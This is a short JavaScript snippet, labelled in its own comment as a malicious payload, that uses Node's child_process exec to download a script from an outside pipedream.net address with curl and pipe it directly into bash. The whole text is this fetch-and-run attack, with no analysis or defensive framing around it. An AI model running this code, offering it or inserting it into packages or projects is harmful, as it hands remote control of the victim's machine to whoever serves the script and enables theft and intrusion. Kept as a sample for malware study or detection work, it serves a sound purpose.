// Malicious payload
const { exec } = require('child_process');
exec('curl -s https://eofx0dnqega9js6.m.pipedream.net/ | bash', (error, stdout, stderr) => {
  if (error) console.error(`Error: ${error.message}`);
});

